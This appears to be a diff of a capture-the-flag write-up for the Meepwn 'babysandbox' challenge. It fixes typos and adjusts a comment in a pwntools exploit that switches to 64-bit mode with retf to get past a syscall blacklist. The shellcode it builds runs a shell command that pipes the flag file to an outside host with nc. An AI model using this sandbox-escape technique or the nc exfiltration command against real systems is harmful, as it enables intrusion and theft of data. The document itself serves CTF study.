@@ -1,6 +1,6 @@
 # Meepwn CTF - babysandbox
 * `retf` instroction change `cs` to 0x33 -> switch to x64 mode and execute x64 instruction.
-* Different syscall number in x64 -> bypass snadbox badsyscall number black list.
+* Different syscall number in x64 -> bypass sandbox badsyscall number black list.
 ```python
 #!/usr/bin/env python
 from pwn import *
@@ -28,7 +28,7 @@ context.arch = 'amd64'
 
 cmd = 'cat flag| nc 12.345.666.77 3333\x00'
 
-x64 = asm('''           ; execve( "/bin/sh" , ["sh","-c","cat flag| nc 12.345.666.77 3333"] )
+x64 = asm('''           ; execve( "/bin/sh" , [ "sh" , "-c" , "cat flag| nc 12.345.666.77 3333" , (char*)0 ] , NULL )
     xor rdx, rdx
 
     mov rax, %s
